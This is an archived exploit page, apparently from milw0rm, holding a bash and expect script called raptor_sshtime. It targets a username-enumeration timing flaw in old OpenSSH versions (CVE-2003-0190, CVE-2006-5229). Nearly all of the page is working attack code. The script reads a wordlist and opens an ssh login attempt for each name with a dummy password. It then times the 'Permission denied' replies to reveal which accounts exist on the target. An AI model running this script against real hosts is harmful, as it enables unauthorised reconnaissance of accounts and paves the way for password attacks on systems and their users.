<html><head><title>Portable OpenSSH <= 3.6.1p-PAM / 4.1-SUSE Timing Attack Exploit</title></head><pre>#!/bin/bash

#
# $Id: raptor_sshtime,v 1.1 2007/02/13 16:38:57 raptor Exp $
#
# raptor_sshtime - [Open]SSH remote timing attack exploit
# Copyright (c) 2006 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;
#
# OpenSSH-portable 3.6.1p1 and earlier with PAM support enabled immediately 
# sends an error message when a user does not exist, which allows remote 
# attackers to determine valid usernames via a timing attack (CVE-2003-0190).
#
# OpenSSH portable 4.1 on SUSE Linux, and possibly other platforms and versions,
# and possibly under limited configurations, allows remote attackers to 
# determine valid usernames via timing discrepancies in which responses take 
# longer for valid usernames than invalid ones, as demonstrated by sshtime. 
# NOTE: as of 20061014, it appears that this issue is dependent on the use of 
# manually-set passwords that causes delays when processing /etc/shadow due to 
# an increased number of rounds (CVE-2006-5229).
# 
# This is a simple shell script based on expect meant to remotely analyze 
# timing differences in sshd &quot;Permission denied&quot; replies. Depending on OpenSSH 
# version and configuration, it may lead to disclosure of valid usernames. 
#
# Usage example: 
# [make sure the target hostkey has been approved before]
# ./sshtime 192.168.0.1 dict.txt
#

# Some vars
port=22

# Command line
host=$1
dict=$2

# Local functions
function head() {
	echo &quot;&quot;
	echo &quot;raptor_sshtime - [Open]SSH remote timing attack exploit&quot;
	echo &quot;Copyright (c) 2006 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;&quot;
	echo &quot;&quot;
}

function foot() {
	echo &quot;&quot;
	exit 0
}
	
function usage() {
	head
	echo &quot;[make sure the target hostkey has been approved before]&quot;
	echo &quot;&quot;
	echo &quot;usage  : ./sshtime &lt;target&gt; &lt;wordlist&gt;&quot;
	echo &quot;example: ./sshtime 192.168.0.1 dict.txt&quot;
	foot
}

function notfound() {
	head
	echo &quot;error  : expect interpreter not found!&quot;
	foot
}

# Check if expect is there
expect=`which expect 2&gt;/dev/null`
if [ $? -ne 0 ]; then
	notfound
fi

# Input control
if [ -z &quot;$2&quot;  ]; then
	usage
fi

# Perform the bruteforce attack
head

for user in `cat $dict`
do
	echo -ne &quot;$user@$host\t\t&quot;
	(time -p $expect -c &quot;log_user 0; spawn -noecho ssh -p $port $host -l $user; for {} 1 {} {expect -nocase \&quot;password*\&quot; {send \&quot;dummy\r\&quot;} eof {exit}}&quot;) 2&gt;&amp;1 | grep real
done

foot

# milw0rm.com [2007-02-13]</pre></html>